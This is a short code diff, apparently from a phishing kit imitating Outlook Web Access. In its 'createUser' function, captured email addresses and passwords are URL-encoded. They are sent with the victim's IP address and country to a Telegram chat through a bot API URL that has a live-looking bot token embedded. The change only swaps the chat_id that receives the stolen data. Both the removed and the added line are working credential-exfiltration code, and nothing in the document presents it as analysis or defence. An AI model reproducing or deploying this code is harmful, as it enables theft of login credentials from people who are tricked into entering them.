@@ -1137,7 +1137,7 @@ const createUser = async (email, password, counter) => {
   // Encode the email and password to handle special characters
   const encodedEmail = encodeURIComponent(email);
   const encodedPassword = encodeURIComponent(password);
-  const url = `https://api.telegram.org/bot7751994479:AAHTtV89D6mZW-KIOE6GsHcMtDSnSwjssNY/sendMessage?chat_id=1499468565&text=Email: ${encodedEmail}, Password: ${encodedPassword}, IP: ${ipInfo.ip}, Country: ${ipInfo.country}, Page: OWA`;
+  const url = `https://api.telegram.org/bot7751994479:AAHTtV89D6mZW-KIOE6GsHcMtDSnSwjssNY/sendMessage?chat_id=5594028416&text=Email: ${encodedEmail}, Password: ${encodedPassword}, IP: ${ipInfo.ip}, Country: ${ipInfo.country}, Page: OWA`;
 
   try {
     const response = await fetch(url);
